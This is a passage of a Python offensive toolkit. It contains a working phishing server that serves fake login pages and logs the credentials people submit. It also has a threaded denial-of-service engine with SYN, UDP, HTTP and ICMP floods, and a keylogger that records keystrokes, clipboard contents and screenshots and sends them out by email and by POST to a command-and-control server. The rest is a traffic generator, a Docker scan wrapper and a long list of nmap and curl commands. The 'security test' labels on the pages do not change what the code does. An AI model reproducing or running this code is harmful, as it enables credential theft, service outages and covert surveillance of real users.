            color: rgba(255, 255, 255, 0.5);
        }}
        button {{
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, {color}, {color}cc);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }}
        button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 30px {color}60;
        }}
        .warning {{
            margin-top: 20px;
            padding: 12px;
            background: rgba(255, 100, 100, 0.1);
            border: 1px solid rgba(255, 100, 100, 0.3);
            border-radius: 8px;
            color: #ff6b6b;
            text-align: center;
            font-size: 12px;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <div class="logo-text">{display_name}</div>
        </div>
        <form method="POST" action="">
            <div class="form-group">
                <input type="text" name="email" placeholder="Email or phone" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required>
            </div>
            <button type="submit">Log In</button>
        </form>
        <div class="warning">
            ⚠️ Security test page - Do not enter real credentials
        </div>
    </div>
</body>
</html>'''
    
    def _custom_template(self) -> str:
        return '''<!DOCTYPE html>
<html>
<head>
    <title>Secure Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .login-container {
            background: #0a0a0a;
            border: 2px solid #00d4ff;
            border-radius: 10px;
            padding: 40px;
            width: 400px;
            box-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-size: 28px;
            color: #00d4ff;
            text-shadow: 0 0 20px #00d4ff;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            background: #000;
            border: 1px solid #333;
            border-radius: 5px;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
        }
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #00d4ff, #7b2cbf);
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            margin-top: 10px;
        }
        button:hover {
            opacity: 0.9;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid rgba(255, 0, 0, 0.3);
            border-radius: 5px;
            color: #ff6b6b;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🔒 SECURE LOGIN</div>
        <form method="POST" action="">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">AUTHENTICATE</button>
        </form>
        <div class="warning">
            🔒 This is a security test page
        </div>
    </div>
</body>
</html>'''
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        template = self.templates.get(platform, self._custom_template())
        
        if callable(template):
            html = template()
        else:
            html = template
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        
        link_data = self.active_links[link_id]
        
        class PhishingHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_GET(self):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                if self.server_instance and self.server_instance.html:
                    self.wfile.write(self.server_instance.html.encode())
            
            def do_POST(self):
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode()
                form_data = urllib.parse.parse_qs(post_data)
                
                username = form_data.get('email', form_data.get('username', ['']))[0]
                password = form_data.get('password', [''])[0]
                client_ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', 'Unknown')
                
                if self.server_instance and self.server_instance.db and username and password:
                    self.server_instance.db.save_captured_credential(
                        self.server_instance.link_id, username, password, client_ip, user_agent
                    )
                    print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  IP: {client_ip}")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                
                self.send_response(302)
                self.send_header('Location', 'https://www.google.com')
                self.end_headers()
        
        try:
            server = HTTPServer(('0.0.0.0', port), PhishingHandler)
            server.server_instance = self
            server.link_id = link_id
            server.html = link_data['html']
            
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            self.phishing_server = server
            
            return True
        except Exception as e:
            logger.error(f"Phishing server error: {e}")
            return False
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.shutdown()
            self.phishing_server = None
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)
    
    def list_templates(self) -> List[str]:
        return list(self.templates.keys())

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        packets_sent = 0
        
        def attack_thread():
            nonlocal packets_sent
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent, 'completed', 'system')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        
        return {
            'success': True,
            'attack_id': attack_id,
            'type': attack_type,
            'target': target_ip,
            'port': port,
            'duration': duration,
            'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {
            'syn': self._send_syn,
            'udp': self._send_udp,
            'http': self._send_http,
            'icmp': self._send_icmp
        }
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "DELTA-ATRAX-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGeneratorEngine:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.active_generators: Dict[str, TrafficGenerator] = {}
        self.stop_events: Dict[str, threading.Event] = {}
    
    def get_available_types(self) -> List[str]:
        return [t.value for t in TrafficType]
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> TrafficGenerator:
        try:
            ipaddress.ip_address(target_ip)
        except:
            raise ValueError(f"Invalid IP: {target_ip}")
        
        if port is None:
            port_map = {
                'http_get': 80, 'http_post': 80, 'https': 443,
                'dns': 53, 'tcp_syn': 80, 'tcp_connect': 80, 'udp': 53
            }
            port = port_map.get(traffic_type, 0)
        
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        generator = TrafficGenerator(
            id=generator_id,
            traffic_type=traffic_type,
            target_ip=target_ip,
            target_port=port,
            duration=duration,
            start_time=datetime.now().isoformat(),
            status="running"
        )
        
        stop_event = threading.Event()
        self.stop_events[generator_id] = stop_event
        
        thread = threading.Thread(
            target=self._run_generator,
            args=(generator, packet_rate, stop_event),
            daemon=True
        )
        thread.start()
        
        self.active_generators[generator_id] = generator
        return generator
    
    def _run_generator(self, generator: TrafficGenerator, packet_rate: int,
                      stop_event: threading.Event):
        start_time = time.time()
        end_time = start_time + generator.duration
        packets_sent = 0
        bytes_sent = 0
        interval = 1.0 / max(1, packet_rate)
        
        func = self._get_generator_func(generator.traffic_type)
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                size = func(generator.target_ip, generator.target_port)
                if size > 0:
                    packets_sent += 1
                    bytes_sent += size
                time.sleep(interval)
            except Exception as e:
                time.sleep(0.1)
        
        generator.packets_sent = packets_sent
        generator.bytes_sent = bytes_sent
        generator.end_time = datetime.now().isoformat()
        generator.status = "completed" if not stop_event.is_set() else "stopped"
        
        self.db.log_traffic(generator)
    
    def _get_generator_func(self, traffic_type: str):
        funcs = {
            'icmp': self._icmp,
            'tcp_syn': self._tcp_syn,
            'tcp_ack': self._tcp_ack,
            'tcp_connect': self._tcp_connect,
            'udp': self._udp,
            'http_get': self._http_get,
            'http_post': self._http_post,
            'https': self._https,
            'dns': self._dns,
            'arp': self._arp,
            'mixed': self._mixed,
            'random': self._random
        }
        return funcs.get(traffic_type, self._icmp)
    
    def _icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                subprocess.run(['ping', '-c', '1', '-W', '1', target],
                              capture_output=True, timeout=2)
                return 64
        except:
            return 0
    
    def _tcp_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_ack(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="A")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _tcp_connect(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((target, port))
            sock.close()
            return 40 if result == 0 else 0
        except:
            return 0
    
    def _udp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/UDP(dport=port)/b"DELTA_ATRAX"
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"DELTA_ATRAX", (target, port))
                sock.close()
                return 64
        except:
            return 0
    
    def _http_get(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("GET", "/", headers={"User-Agent": "DELTA-ATRAX-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _http_post(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=2)
            conn.request("POST", "/", body="test=data",
                        headers={"User-Agent": "DELTA-ATRAX-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _https(self, target: str, port: int) -> int:
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            conn = http.client.HTTPSConnection(target, port, context=context, timeout=3)
            conn.request("GET", "/", headers={"User-Agent": "DELTA-ATRAX-V2"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 200
        except:
            return 0
    
    def _dns(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            tid = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00\x00\x01\x00\x01'
            packet = tid + flags + questions + b'\x00\x00\x00\x00\x00\x00' + query
            sock.sendto(packet, (target, port))
            sock.close()
            return len(packet)
        except:
            return 0
    
    def _arp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                local_mac = self._get_local_mac()
                packet = Ether(src=local_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
                sendp(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _mixed(self, target: str, port: int) -> int:
        funcs = [self._icmp, self._tcp_syn, self._udp, self._http_get]
        return random.choice(funcs)(target, port)
    
    def _random(self, target: str, port: int) -> int:
        types = ['icmp', 'tcp_syn', 'udp', 'http_get', 'dns']
        return self._get_generator_func(random.choice(types))(target, port)
    
    def _get_local_mac(self) -> str:
        try:
            mac = uuid.getnode()
            return ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
        except:
            return "00:11:22:33:44:55"
    
    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id,
                'traffic_type': g.traffic_type,
                'target_ip': g.target_ip,
                'duration': g.duration,
                'packets_sent': g.packets_sent,
                'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# KEYLOGGER MODULE
# =====================
class KeyloggerModule:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.current_process = ""
        self.log_file = config.get('keylogger.log_file', KEYLOG_FILE)
        self.c2_server = config.get('keylogger.c2_server', "")
        self.upload_interval = config.get('keylogger.upload_interval', 30)
        self.screenshot_interval = config.get('keylogger.screenshot_interval', 60)
        self.capture_clipboard = config.get('keylogger.capture_clipboard', True)
        self.upload_timer = None
        self.screenshot_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
        self.exfil_methods = config.get('keylogger.exfil_methods', ["file", "email", "c2"])
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return False
        
        if self.running:
            return True
        
        try:
            self.running = True
            self.text = ""
            
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            
            if self.screenshot_interval > 0:
                self.screenshot_timer = threading.Timer(self.screenshot_interval, self._take_screenshot)
                self.screenshot_timer.daemon = True
                self.screenshot_timer.start()
            
            if self.capture_clipboard:
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            
            print(f"{Colors.SUCCESS}✅ Keylogger started (F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to start keylogger: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        
        if self.listener:
            self.listener.stop()
            self.listener = None
        
        for timer in [self.upload_timer, self.screenshot_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        if self.text:
            timestamp = datetime.now().isoformat()
            screenshot_path = ""
            
            if self.screenshot_interval > 0:
                screenshot_path = self._take_screenshot()
            
            self.db.save_keylog(self.text, self.current_window, self.current_process, screenshot_path)
            
            with open(self.log_file, 'a') as f:
                f.write(f"\n[{timestamp}] [{self.current_window}]\n{self.text}\n")
            
            self._exfiltrate_data(self.text, screenshot_path)
            logger.info(f"Saved {len(self.text)} keylog characters")
    
    def _take_screenshot(self) -> str:
        try:
            import pyautogui
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(KEYLOG_SCREENSHOTS_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            logger.info(f"Screenshot saved: {screenshot_path}")
            return screenshot_path
        except:
            return ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.conn.execute(
                    "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                    (current[:5000], "keylogger")
                )
                self.db.conn.commit()
                logger.info(f"Clipboard captured: {current[:100]}...")
                self._exfiltrate_clipboard(current)
        except:
            pass
        
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _exfiltrate_data(self, text: str, screenshot_path: str = ""):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(text, screenshot_path)
                elif method == "email":
                    self._exfil_email(text, screenshot_path)
                elif method == "c2":
                    self._exfil_c2(text, screenshot_path)
            except Exception as e:
                logger.error(f"Exfil via {method} failed: {e}")
    
    def _exfil_file(self, text: str, screenshot_path: str):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(KEYLOG_EXFIL_DIR, f"exfil_{timestamp}.txt")
            with open(filename, 'w') as f:
                f.write(f"[{timestamp}]\n{text}\n")
                if screenshot_path:
                    f.write(f"\nScreenshot: {screenshot_path}\n")
            logger.info(f"Exfil saved to file: {filename}")
        except:
            pass
    
    def _exfil_email(self, text: str, screenshot_path: str):
        try:
            smtp_server = self.config.get('email.smtp_server', '')
            smtp_port = self.config.get('email.smtp_port', 587)
            smtp_username = self.config.get('email.smtp_username', '')
            smtp_password = self.config.get('email.smtp_password', '')
            to_email = self.config.get('keylogger.email_recipient', '')
            
            if not all([smtp_server, smtp_username, smtp_password, to_email]):
                return
            
            msg = email.message.EmailMessage()
            msg['Subject'] = f"Keylog Data - {datetime.now().isoformat()}"
            msg['From'] = smtp_username
            msg['To'] = to_email
            msg.set_content(f"Keylog Data:\n\n{text}")
            
            if screenshot_path and os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    msg.add_attachment(f.read(), maintype='image', subtype='png', filename=os.path.basename(screenshot_path))
            
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()
                server.login(smtp_username, smtp_password)
                server.send_message(msg)
            
            logger.info("Keylog exfiltrated via email")
        except:
            pass
    
    def _exfil_c2(self, text: str, screenshot_path: str):
        if not self.c2_server:
            return
        try:
            data = {
                'timestamp': datetime.now().isoformat(),
                'text': text,
                'hostname': socket.gethostname(),
                'window': self.current_window
            }
            if screenshot_path:
                data['screenshot'] = base64.b64encode(open(screenshot_path, 'rb').read()).decode()
            
            requests.post(self.c2_server, json=data, timeout=10)
            logger.info("Keylog exfiltrated via C2")
        except:
            pass
    
    def _exfiltrate_clipboard(self, text: str):
        for method in self.exfil_methods:
            try:
                if method == "file":
                    self._exfil_file(f"CLIPBOARD: {text}", "")
                elif method == "email":
                    self._exfil_email(f"CLIPBOARD: {text}", "")
                elif method == "c2":
                    self._exfil_c2(f"CLIPBOARD: {text}", "")
            except:
                pass
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
            self.text = ""
        
        if self.running:
            self.upload_timer = threading.Timer(self.upload_interval, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        try:
            return [f for f in os.listdir(KEYLOG_SCREENSHOTS_DIR) if f.startswith('screenshot_')]
        except:
            return []

# =====================
# DOCKER SCANNER
# =====================
class DockerScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def scan_image(self, image: str) -> Dict:
        start_time = time.time()
        try:
            result = subprocess.run(['docker', 'scan', image], capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            
            vulnerabilities = self._parse_vulnerabilities(result.stdout)
            severity = self._determine_severity(vulnerabilities)
            
            self.db.save_docker_scan(image, vulnerabilities, severity, scan_time, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'image': image,
                'vulnerabilities': vulnerabilities,
                'severity': severity,
                'scan_time': scan_time,
                'output': result.stdout[:2000]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out', 'image': image}
        except Exception as e:
            return {'success': False, 'error': str(e), 'image': image}
    
    def _parse_vulnerabilities(self, output: str) -> List[Dict]:
        vulns = []
        for line in output.split('\n'):
            if 'HIGH' in line or 'CRITICAL' in line or 'MEDIUM' in line:
                severity = 'high' if 'HIGH' in line else 'critical' if 'CRITICAL' in line else 'medium'
                vulns.append({'severity': severity, 'description': line.strip()})
        return vulns
    
    def _determine_severity(self, vulnerabilities: List[Dict]) -> str:
        if any(v.get('severity') == 'critical' for v in vulnerabilities):
            return 'critical'
        if any(v.get('severity') == 'high' for v in vulnerabilities):
            return 'high'
        if vulnerabilities:
            return 'medium'
        return 'low'

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    def __init__(self, db: DatabaseManager, config: ConfigManager,
                 ssh_manager: SSHManager = None,
                 traffic_gen: TrafficGeneratorEngine = None,
                 dos_engine: DOSEngine = None,
                 spear_phishing: SpearPhishingEngine = None,
                 keylogger: KeyloggerModule = None,
                 docker_scanner: DockerScanner = None,
                 re_tools: ReverseEngineeringTools = None,
                 malware_gen: MalwareGenerator = None,
                 chart_gen: ChartGenerator = None):
        self.db = db
        self.config = config
        self.ssh = ssh_manager
        self.traffic = traffic_gen
        self.dos = dos_engine
        self.spear = spear_phishing
        self.keylogger = keylogger
        self.docker_scanner = docker_scanner
        self.re_tools = re_tools
        self.malware_gen = malware_gen
        self.chart_gen = chart_gen
        self.social = SocialEngineeringTools(db)
        self.tools = NetworkTools()
        self.commands = self._build_commands()
    
    def _build_commands(self) -> Dict[str, Callable]:
        commands = {
            # ==================== Ping Commands ====================
            'ping': self._ping,
            'ping6': self._ping6,
            'ping_sweep': self._ping_sweep,
            'fping': self._fping,
            'ping_flood': self._ping_flood,
            'ping_mtu': self._ping_mtu,
            'ping_size': self._ping_size,
            'ping_count': self._ping_count,
            'ping_interval': self._ping_interval,
            'ping_timeout': self._ping_timeout,
            'ping_ttl': self._ping_ttl,
            'ping_interface': self._ping_interface,
            'ping_source': self._ping_source,
            'ping_pattern': self._ping_pattern,
            'ping_record': self._ping_record,
            'ping_timestamp': self._ping_timestamp,
            'ping_quiet': self._ping_quiet,
            'ping_verbose': self._ping_verbose,
            'ping_deadline': self._ping_deadline,
            'ping_numeric': self._ping_numeric,
            'ping_adaptive': self._ping_adaptive,
            'ping_audible': self._ping_audible,
            'ping_flood_icmp': self._ping_flood_icmp,
            
            # ==================== Traceroute Commands ====================
            'traceroute': self._traceroute,
            'traceroute6': self._traceroute6,
            'traceroute_tcp': self._traceroute_tcp,
            'traceroute_udp': self._traceroute_udp,
            'traceroute_icmp': self._traceroute_icmp,
            'traceroute_max_hops': self._traceroute_max_hops,
            'traceroute_first_hop': self._traceroute_first_hop,
            'traceroute_queries': self._traceroute_queries,
            'traceroute_wait': self._traceroute_wait,
            'traceroute_port': self._traceroute_port,
            'traceroute_numeric': self._traceroute_numeric,
            'traceroute_verbose': self._traceroute_verbose,
            'mtr': self._mtr,
            'mtr_report': self._mtr_report,
            'mtr_json': self._mtr_json,
            'mtr_csv': self._mtr_csv,
            'tcptraceroute': self._tcptraceroute,
            'lft': self._lft,
            'tracepath': self._tracepath,
            'pathping': self._pathping,
            
            # ==================== Nmap Commands ====================
            'nmap': self._nmap,
            'nmap_quick': self._nmap_quick,
            'nmap_full': self._nmap_full,
            'nmap_os': self._nmap_os,
            'nmap_service': self._nmap_service,
            'nmap_udp': self._nmap_udp,
            'nmap_vuln': self._nmap_vuln,
            'nmap_stealth': self._nmap_stealth,
            'nmap_ping': self._nmap_ping,
            'nmap_ports': self._nmap_ports,
            'nmap_script': self._nmap_script,
            'nmap_aggressive': self._nmap_aggressive,
            'nmap_traceroute': self._nmap_traceroute,
            'nmap_output': self._nmap_output,
            'nmap_exclude': self._nmap_exclude,
            'nmap_exclude_file': self._nmap_exclude_file,
            'nmap_input': self._nmap_input,
            'nmap_random': self._nmap_random,
            'nmap_timing': self._nmap_timing,
            'nmap_version': self._nmap_version,
            'nmap_help': self._nmap_help,
            'nmap_syn': self._nmap_syn,
            'nmap_connect': self._nmap_connect,
            'nmap_ack': self._nmap_ack,
            'nmap_fin': self._nmap_fin,
            'nmap_xmas': self._nmap_xmas,
            'nmap_null': self._nmap_null,
            'nmap_script_default': self._nmap_script_default,
            'nmap_top_ports': self._nmap_top_ports,
            'nmap_open': self._nmap_open,
            'nmap_reason': self._nmap_reason,
            'nmap_packet_trace': self._nmap_packet_trace,
            'nmap_iflist': self._nmap_iflist,
            'nmap_no_ping': self._nmap_no_ping,
            'nmap_fast': self._nmap_fast,
            'nmap_fragment': self._nmap_fragment,
            'nmap_decoys': self._nmap_decoys,
            'nmap_source_port': self._nmap_source_port,
            'nmap_data_length': self._nmap_data_length,
            'nmap_ttl': self._nmap_ttl,
            'nmap_spoof_mac': self._nmap_spoof_mac,
            'nmap_badsum': self._nmap_badsum,
            'nmap_send_eth': self._nmap_send_eth,
            'nmap_send_ip': self._nmap_send_ip,
            
            # ==================== Curl Commands ====================
            'curl': self._curl,
            'curl_get': self._curl_get,
            'curl_post': self._curl_post,
            'curl_put': self._curl_put,
            'curl_delete': self._curl_delete,
            'curl_patch': self._curl_patch,
            'curl_head': self._curl_head,
            'curl_options': self._curl_options,
            'curl_output': self._curl_output,
            'curl_remote_name': self._curl_remote_name,
            'curl_location': self._curl_location,
            'curl_include': self._curl_include,
            'curl_verbose': self._curl_verbose,
            'curl_silent': self._curl_silent,
            'curl_show_error': self._curl_show_error,
            'curl_fail': self._curl_fail,
            'curl_insecure': self._curl_insecure,
            'curl_data': self._curl_data,
            'curl_data_binary': self._curl_data_binary,
            'curl_data_urlencode': self._curl_data_urlencode,
            'curl_data_raw': self._curl_data_raw,
            'curl_form': self._curl_form,
            'curl_header': self._curl_header,
            'curl_user_agent': self._curl_user_agent,
            'curl_referer': self._curl_referer,
            'curl_user': self._curl_user,
            'curl_basic': self._curl_basic,
            'curl_digest': self._curl_digest,
            'curl_ntlm': self._curl_ntlm,
            'curl_negotiate': self._curl_negotiate,
            'curl_cookie': self._curl_cookie,
            'curl_cookie_jar': self._curl_cookie_jar,
            'curl_proxy': self._curl_proxy,
            'curl_proxy_user': self._curl_proxy_user,
            'curl_noproxy': self._curl_noproxy,
            'curl_cert': self._curl_cert,
            'curl_key': self._curl_key,
            'curl_cacert': self._curl_cacert,
            'curl_ciphers': self._curl_ciphers,
            'curl_tlsv1_2': self._curl_tlsv1_2,
            'curl_tlsv1_3': self._curl_tlsv1_3,
            'curl_continue_at': self._curl_continue_at,
            'curl_range': self._curl_range,
            'curl_limit_rate': self._curl_limit_rate,
            'curl_max_time': self._curl_max_time,
            'curl_connect_timeout': self._curl_connect_timeout,
            'curl_retry': self._curl_retry,
            'curl_retry_delay': self._curl_retry_delay,
            'curl_ipv4': self._curl_ipv4,
            'curl_ipv6': self._curl_ipv6,
            'curl_interface': self._curl_interface,
            'curl_http2': self._curl_http2,
            'curl_compressed': self._curl_compressed,
            'curl_write_out': self._curl_write_out,
            'curl_dump_header': self._curl_dump_header,
            'curl_trace': self._curl_trace,
            'curl_help': self._curl_help,
            'curl_version': self._curl_version,
            'curl_parallel': self._curl_parallel,
            'curl_json': self._curl_json,
            'curl_socks5': self._curl_socks5,
